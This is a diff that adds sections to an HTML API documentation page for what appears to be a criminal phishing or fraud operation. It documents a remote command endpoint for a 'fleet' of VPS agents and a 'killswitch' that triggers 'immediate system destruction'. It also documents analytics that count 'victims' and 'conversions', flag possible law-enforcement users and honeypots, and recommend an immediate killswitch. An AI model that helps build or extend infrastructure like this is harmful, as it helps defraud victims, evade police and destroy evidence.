@@ -54,6 +54,177 @@ Response:
             </div>
         </section>
 
+        <!-- VPS Agent Endpoints -->
+        <section class="mb-12">
+            <h2 class="text-2xl font-semibold text-gray-800 mb-6">🚁 VPS Agent Endpoints</h2>
+            
+            <div class="space-y-6">
+                <!-- POST /vps/command -->
+                <div class="bg-white p-6 rounded-lg shadow-sm border">
+                    <h3 class="text-lg font-semibold mb-4 text-purple-600">POST /vps/command</h3>
+                    <p class="text-gray-600 mb-4">Receive and execute commands from fleet master</p>
+                    
+                    <div class="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm">
+<pre>POST /vps/command
+Content-Type: application/json
+
+{
+  "command": "status"
+}
+
+Response:
+{
+  "status": "active",
+  "uptime": "running",
+  "version": "v2.1.0"
+}</pre>
+                    </div>
+                </div>
+
+                <!-- POST /vps/killswitch -->
+                <div class="bg-white p-6 rounded-lg shadow-sm border border-red-200">
+                    <h3 class="text-lg font-semibold mb-4 text-red-600">POST /vps/killswitch</h3>
+                    <p class="text-gray-600 mb-4">⚠️ Emergency kill switch endpoint for VPS agents</p>
+                    
+                    <div class="bg-gray-900 text-red-400 p-4 rounded-lg font-mono text-sm">
+<pre>POST /vps/killswitch
+Content-Type: application/json
+
+{
+  "admin_key": "your_admin_key_here",
+  "destruction_level": 3,
+  "reason": "Emergency activation"
+}
+
+Response:
+{
+  "success": true,
+  "vps_id": "vps-abc123",
+  "stage": "RECEIVED",
+  "message": "Kill switch command received",
+  "timestamp": "2024-01-15T10:30:00Z"
+}</pre>
+                    </div>
+                    
+                    <div class="mt-4 p-4 bg-red-50 border-l-4 border-red-400">
+                        <p class="text-red-700 text-sm font-semibold">
+                            ⚠️ WARNING: This endpoint triggers immediate system destruction.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Fleet Analytics -->
+        <section class="mb-12">
+            <h2 class="text-2xl font-semibold text-gray-800 mb-6">📊 Fleet Analytics</h2>
+            
+            <div class="space-y-6">
+                <!-- GET /api/metrics/customer -->
+                <div class="bg-white p-6 rounded-lg shadow-sm border">
+                    <h3 class="text-lg font-semibold mb-4 text-purple-600">GET /api/metrics/customer</h3>
+                    <p class="text-gray-600 mb-4">Customer behavior and success metrics across fleet</p>
+                    
+                    <div class="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm">
+<pre>GET /api/metrics/customer?hours=24
+
+Response:
+{
+  "timeframe_hours": 24,
+  "cutoff_time": "2024-01-14T10:30:00Z",
+  "summary": {
+    "total_customers": 150,
+    "active_sessions": 23,
+    "conversion_rate": 0.18,
+    "high_risk_count": 5
+  },
+  "alerts": [
+    {
+      "type": "critical_victim",
+      "email": "admin@government.gov",
+      "risk_score": 95,
+      "message": "Critical risk victim detected - possible law enforcement"
+    }
+  ]
+}</pre>
+                    </div>
+                </div>
+
+                <!-- GET /api/metrics/links -->
+                <div class="bg-white p-6 rounded-lg shadow-sm border">
+                    <h3 class="text-lg font-semibold mb-4 text-purple-600">GET /api/metrics/links</h3>
+                    <p class="text-gray-600 mb-4">Link performance analytics and optimization data</p>
+                    
+                    <div class="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm">
+<pre>GET /api/metrics/links
+
+Response:
+{
+  "success": true,
+  "link_performance": {
+    "total_links": 25,
+    "active_links": 18,
+    "avg_click_rate": 0.23,
+    "top_performing": [
+      {
+        "slug": "customer123",
+        "clicks": 150,
+        "conversions": 45,
+        "conversion_rate": 0.30
+      }
+    ]
+  },
+  "geographic_distribution": {
+    "US": 120,
+    "UK": 45,
+    "CA": 30
+  }
+}</pre>
+                    </div>
+                </div>
+
+                <!-- GET /api/security/alerts -->
+                <div class="bg-white p-6 rounded-lg shadow-sm border">
+                    <h3 class="text-lg font-semibold mb-4 text-purple-600">GET /api/security/alerts</h3>
+                    <p class="text-gray-600 mb-4">Real-time security alerts and threat detection</p>
+                    
+                    <div class="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm">
+<pre>GET /api/security/alerts
+
+Response:
+{
+  "success": true,
+  "alerts": [
+    {
+      "id": "alert_789",
+      "type": "law_enforcement_ip",
+      "severity": "critical",
+      "email": "detective@police.gov",
+      "message": "Law enforcement IP range detected",
+      "timestamp": "2024-01-15T10:25:00Z",
+      "source_ip": "192.168.100.50",
+      "recommended_action": "immediate_killswitch"
+    },
+    {
+      "id": "alert_790",
+      "type": "honeypot_detection",
+      "severity": "high",
+      "message": "Honeypot interaction detected",
+      "timestamp": "2024-01-15T10:20:00Z"
+    }
+  ],
+  "alert_counts": {
+    "critical": 1,
+    "high": 3,
+    "medium": 8,
+    "low": 12
+  }
+}</pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
         <!-- Captured Data Endpoints -->
         <section class="mb-12">
             <h2 class="text-2xl font-semibold text-gray-800 mb-6">Captured Data</h2>
